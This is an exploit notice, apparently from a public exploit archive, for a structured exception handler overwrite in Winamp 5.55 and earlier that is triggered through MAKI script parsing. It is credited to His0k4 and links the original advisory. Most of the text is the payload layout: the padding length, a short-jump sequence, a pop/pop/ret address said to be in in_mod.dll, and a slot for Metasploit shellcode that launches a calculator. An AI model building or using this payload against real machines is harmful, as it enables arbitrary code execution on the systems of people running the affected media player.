[x] Bug: Winamp <= 5.55 (MAKI script) Universal Seh Overwrite Exploit
[x] Original advisory: http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html
[x] Exploited By His0k4

[x] Description: The vulnerabilty is due when parsing a maki script file exactly in the "getRuntimeVersion"
                 and we can overwrite the seh easily :)
				 
The exploit schema looks like this:
payload = "\x41"*16756
payload += "\x74\x06\x90\x90"
payload += "\x32\x55\xF0\x12" # universal p/p/r in_mod.dll
payload += shellcode # calc shellcode from metasploit
